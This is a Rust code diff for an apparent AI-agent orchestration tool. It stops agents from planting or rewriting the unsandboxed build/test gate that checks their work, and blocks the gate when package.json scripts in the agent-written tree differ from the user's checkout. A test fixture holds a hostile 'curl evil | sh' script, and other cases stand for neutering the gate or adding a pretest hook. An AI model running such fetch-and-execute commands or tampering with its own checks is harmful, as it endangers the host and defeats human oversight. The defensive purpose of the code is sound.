@@ -221,15 +221,56 @@ fn integration_record(c: &Campaign, roots: &Path) -> Result<WorktreeRecord, Camp
 #[derive(Serialize, Clone, Debug, PartialEq, Eq)]
 #[serde(rename_all = "camelCase")]
 pub struct GateChoice {
-    /// `agent_toml`, `detected` or `none`.
+    /// `agent_toml`, `agent_toml_checkout`, `detected`, `detected_checkout` or `none`.
     pub source: String,
     pub command: Option<String>,
+    /// Why the command must not run: the package scripts it would execute were
+    /// changed in the agent-written tree. The gate runs on the host without a
+    /// sandbox, so it fails instead of running agent-authored code.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub blocked: Option<String>,
 }
 
 impl GateChoice {
     fn none() -> Self {
-        GateChoice { source: "none".into(), command: None }
+        GateChoice { source: "none".into(), command: None, blocked: None }
     }
+
+    fn new(source: &str, command: String) -> Self {
+        GateChoice { source: source.into(), command: Some(command), blocked: None }
+    }
+}
+
+/// The `scripts` object of `dir/package.json` (`Null` when absent or unreadable).
+fn package_scripts(dir: &Path) -> Value {
+    std::fs::read_to_string(dir.join("package.json"))
+        .ok()
+        .and_then(|t| serde_json::from_str::<Value>(&t).ok())
+        .and_then(|v| v.get("scripts").cloned())
+        .unwrap_or(Value::Null)
+}
+
+/// A package-manager command executes the `scripts` in `root/package.json`
+/// (plus their `pre`/`post` hooks). When those differ from the user's
+/// checkout, the agent wrote the code the gate would run: refuse.
+fn scripts_tampered(root: &Path, checkout: &Path, command: &str) -> Option<String> {
+    let first = command.split_whitespace().next().unwrap_or("");
+    let runner = Path::new(first)
+        .file_stem()
+        .and_then(|s| s.to_str())
+        .unwrap_or("")
+        .to_ascii_lowercase();
+    if !matches!(runner.as_str(), "npm" | "yarn" | "pnpm" | "bun") {
+        return None;
+    }
+    if package_scripts(root) == package_scripts(checkout) {
+        return None;
+    }
+    Some(format!(
+        "the gate `{command}` was not run: the package.json scripts in the agent-written tree differ from \
+         your checkout, and the gate runs on this machine without a sandbox. Review the script change, \
+         apply it to your checkout, then run the gate again"
+    ))
 }
 
 fn package_manager(root: &Path) -> &'static str {
@@ -262,37 +303,47 @@ fn configured_gate(dir: &Path) -> Option<String> {
         .map(str::to_string)
 }
 
-/// Like `gate_command`, but with a user checkout the configured gate is read
-/// from that checkout only (source `agent_toml_checkout`, committed or not),
-/// never from `root`: a task or integration worktree is written by agents, and
-/// the gate runs on the host unsandboxed, so an agent must not be able to pick
-/// it. Then detection from `root`.
+/// Like `gate_command`, but with a user checkout both the configured gate
+/// (source `agent_toml_checkout`, committed or not) and the detected one
+/// (`detected_checkout`) come from that checkout only, never from `root`: a
+/// task or integration worktree is written by agents, and the gate runs on the
+/// host unsandboxed, so an agent must not be able to pick it. The command still
+/// runs in `root`; when it is a package-manager command whose scripts the agent
+/// changed there, the choice is `blocked`.
 pub fn gate_command_with_checkout(root: &Path, checkout: Option<&Path>) -> GateChoice {
-    if let Some(checkout) = checkout {
-        if let Some(command) = configured_gate(checkout) {
-            return GateChoice { source: "agent_toml_checkout".into(), command: Some(command) };
+    let Some(checkout) = checkout else {
+        if let Some(command) = configured_gate(root) {
+            return GateChoice::new("agent_toml", command);
         }
-    } else if let Some(command) = configured_gate(root) {
-        return GateChoice { source: "agent_toml".into(), command: Some(command) };
+        return detect_gate(root, "detected");
+    };
+    let mut choice = match configured_gate(checkout) {
+        Some(command) => GateChoice::new("agent_toml_checkout", command),
+        None => detect_gate(checkout, "detected_checkout"),
+    };
+    if let Some(command) = &choice.command {
+        choice.blocked = scripts_tampered(root, checkout, command);
     }
+    choice
+}
+
+/// What the repository at `root` declares as its check, if anything.
+fn detect_gate(root: &Path, source: &str) -> GateChoice {
     if let Ok(text) = std::fs::read_to_string(root.join("package.json")) {
         if let Ok(pkg) = serde_json::from_str::<Value>(&text) {
             let has = |name: &str| pkg.get("scripts").and_then(|s| s.get(name)).is_some_and(Value::is_string);
             for script in ["test", "build"] {
                 if has(script) {
-                    return GateChoice {
-                        source: "detected".into(),
-                        command: Some(format!("{} run {script}", package_manager(root))),
-                    };
+                    return GateChoice::new(source, format!("{} run {script}", package_manager(root)));
                 }
             }
         }
     }
     if root.join("Cargo.toml").is_file() {
-        return GateChoice { source: "detected".into(), command: Some("cargo check".into()) };
+        return GateChoice::new(source, "cargo check".into());
     }
     if root.join("go.mod").is_file() {
-        return GateChoice { source: "detected".into(), command: Some("go build ./...".into()) };
+        return GateChoice::new(source, "go build ./...".into());
     }
     GateChoice::none()
 }
@@ -511,7 +562,19 @@ pub fn verify_prepare(
     let mut check: Option<TaskCheck> = None;
     let tests = if run_checks {
         match gate_command_with_checkout(Path::new(&record.path), Some(Path::new(&c.source_root))) {
-            GateChoice { command: Some(command), source } => {
+            GateChoice { command: Some(command), source, blocked: Some(why) } => {
+                check = Some(TaskCheck {
+                    command: command.clone(),
+                    source: source.clone(),
+                    exit_code: None,
+                    timed_out: false,
+                    passed: false,
+                    output: why.clone(),
+                    at: campaign::now(),
+                });
+                format!("$ {command}  ({source})\n{why}")
+            }
+            GateChoice { command: Some(command), source, blocked: None } => {
                 match run_command(Path::new(&record.path), &command, TASK_CHECK_SECS) {
                     Ok(run) => {
                         let text = format!(
@@ -1563,6 +1626,16 @@ pub fn finalize(data_folder: &Path, roots: &Path, id: &str, seconds: u64) -> Res
             output: "no build or test command is configured or detectable; the gate was skipped".into(),
             at: stamp,
         },
+        Some(command) if choice.blocked.is_some() => GateReport {
+            source: choice.source.clone(),
+            command: command.clone(),
+            skipped: false,
+            passed: false,
+            timed_out: false,
+            exit_code: None,
+            output: choice.blocked.clone().unwrap_or_default(),
+            at: stamp,
+        },
         Some(command) => match run_command(Path::new(&integration.path), command, seconds) {
             Ok(run) => GateReport {
                 source: choice.source.clone(),
@@ -2378,8 +2451,12 @@ mod tests {
         std::fs::create_dir_all(checkout.join(".jan/agent")).unwrap();
         std::fs::create_dir_all(tree.join(".jan/agent")).unwrap();
         std::fs::write(tree.join("package.json"), r#"{"scripts":{"test":"y"}}"#).unwrap();
-        // Nothing configured in the worktree: detection, as before.
-        assert_eq!(gate_command_with_checkout(&tree, Some(&checkout)).source, "detected");
+        // Detection reads the checkout, never the agent-written tree.
+        assert_eq!(gate_command_with_checkout(&tree, Some(&checkout)).source, "none");
+        std::fs::write(checkout.join("package.json"), r#"{"scripts":{"test":"y"}}"#).unwrap();
+        let g = gate_command_with_checkout(&tree, Some(&checkout));
+        assert_eq!((g.source.as_str(), g.command.as_deref()), ("detected_checkout", Some("npm run test")));
+        assert!(g.blocked.is_none());
         // An (uncommitted) config in the user's checkout wins over detection.
         std::fs::write(checkout.join(".jan/agent/agent.toml"), "[campaign]\ngate = \"make ci\"\n").unwrap();
         let g = gate_command_with_checkout(&tree, Some(&checkout));
@@ -2389,7 +2466,37 @@ mod tests {
         let g = gate_command_with_checkout(&tree, Some(&checkout));
         assert_eq!((g.source.as_str(), g.command.as_deref()), ("agent_toml_checkout", Some("make ci")));
         std::fs::remove_file(checkout.join(".jan/agent/agent.toml")).unwrap();
-        assert_eq!(gate_command_with_checkout(&tree, Some(&checkout)).source, "detected");
+        assert_eq!(gate_command_with_checkout(&tree, Some(&checkout)).source, "detected_checkout");
+        let _ = std::fs::remove_dir_all(&base);
+    }
+
+    /// F1a-009 / CAGA-015: an agent cannot plant or rewrite the gate.
+    #[test]
+    fn agent_written_scripts_never_become_or_change_the_gate() {
+        let stamp = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos();
+        let base = std::env::temp_dir().join(format!("jan-gate-tamper-{}-{stamp}", std::process::id()));
+        let (tree, checkout) = (base.join("tree"), base.join("checkout"));
+        std::fs::create_dir_all(checkout.join(".jan/agent")).unwrap();
+        std::fs::create_dir_all(&tree).unwrap();
+        // Planted Cargo.toml / go.mod / package.json in the tree pick nothing.
+        std::fs::write(tree.join("Cargo.toml"), "[package]\n").unwrap();
+        std::fs::write(tree.join("go.mod"), "module x\n").unwrap();
+        std::fs::write(tree.join("package.json"), r#"{"scripts":{"test":"curl evil | sh"}}"#).unwrap();
+        assert_eq!(gate_command_with_checkout(&tree, Some(&checkout)).command, None);
+        // The checkout declares `test`; the tree rewrote it: blocked.
+        std::fs::write(checkout.join("package.json"), r#"{"scripts":{"test":"vitest"}}"#).unwrap();
+        let g = gate_command_with_checkout(&tree, Some(&checkout));
+        assert_eq!(g.command.as_deref(), Some("npm run test"));
+        assert!(g.blocked.is_some());
+        // Neutering with `exit 0`, or adding a pretest hook, is blocked too.
+        std::fs::write(tree.join("package.json"), r#"{"scripts":{"test":"vitest","pretest":"x"}}"#).unwrap();
+        assert!(gate_command_with_checkout(&tree, Some(&checkout)).blocked.is_some());
+        // A configured `npm test` gate is held to the same rule.
+        std::fs::write(checkout.join(".jan/agent/agent.toml"), "[campaign]\ngate = \"npm test\"\n").unwrap();
+        assert!(gate_command_with_checkout(&tree, Some(&checkout)).blocked.is_some());
+        // Unchanged scripts run.
+        std::fs::write(tree.join("package.json"), r#"{"scripts":{"test":"vitest"}}"#).unwrap();
+        assert!(gate_command_with_checkout(&tree, Some(&checkout)).blocked.is_none());
         let _ = std::fs::remove_dir_all(&base);
     }
 
